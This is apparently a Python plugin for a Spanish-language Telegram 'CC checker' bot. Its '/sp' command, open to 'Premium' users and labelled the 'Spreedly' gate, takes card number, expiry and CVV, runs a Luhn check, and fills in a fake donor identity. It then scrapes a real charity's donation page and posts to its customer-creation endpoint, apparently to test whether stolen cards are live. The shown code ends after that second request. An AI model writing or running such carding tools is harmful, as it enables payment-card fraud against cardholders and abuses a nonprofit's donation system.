from plugins.defs1 import get_cc, luhn, bininfo
from pyrogram import Client, filters
import aiohttp
import requests
from pyrogram.types import Message
import time
import random
from faker import Faker
from plugins.clases.usuarios import usuario
def buscar(res, primer, final):
    try:
        inicio = res.index( primer ) + len( primer )
        fin = res.index( final, inicio )
        return res[inicio:fin]
    except ValueError:
        return None

gate = "Spreedly"
emojis1 = ["🙈", "💦", "🌏", "🐸", "🐧"]
emojis2 = ["😠", "☔", "☀", "🌈"]
rnd_emoji1 = random.choice(emojis1)
rnd_emoji2 = random.choice(emojis2)
r = requests.Session()
@Client.on_message(filters.command(["sp"], prefixes=["/", "."]))
async def premium(_, m: Message):
    start_time = time.time()
    user = m.from_user.username
    id = m.from_user.id
    user = usuario(nombre=user, id=id)
    rango = user.buscarR()
    if not rango or rango == False: return await m.reply('<b>Usuario no registrado porfavor registrese</b>')
    if rango == 'Free':
        return await m.reply('<b>Necesita ser Premium para utilizar este gate</b>')
    try:
        cc, mes, año, cvv = get_cc(m.text)
        veri = luhn(cc)
        if not cc or not mes or not año or not cvv: return await m.reply('<b>Formato invalido</b>')
        if veri == False: return await m.reply("<b>Algoritmo Luhn invalido ❌</b>")
    except Exception:
        return await m.reply("<b>Formato invalido\nCC|MES|AÑO|CVV</b>")
    respuesta = await m.reply(f"""<b>Checkeando CC | ⏳</b>""")
    fake = Faker()
    email = fake.ascii_free_email()
    
    r1 = r.get("https://raisedonors.com/ilad/donation-page?embed=true")
    encryptedData = buscar(r1.text, 'id="cphDonationForm_hdnStaxContextInfo" value="', '"')
    if not r1 or not encryptedData: return await m.reply('<b>Error 1</b>')
    
    
    customer_Data = {
	"billing_address": "street 157",
	"billing_city": "street 157",
	"billing_country": "USA",
	"billing_state": "NY",
	"billing_zip": "10080",
	"emailAddress": email,
	"encryptedData": encryptedData,
	"fname": "jose",
	"lname": "hernandez",
	"organizationId": "41076",
	"organizationName": "",
	"phone": "7171231234"
}
    r2 = r.post("https://raisedonors.com/mvc/virtuous-payments/service/findCreateCustomer", data=customer_Data)
    try:
        customerId = r2.json()["customerId"]
    except Exception as e:
        return await m.reply('<b>Error req 2</b>')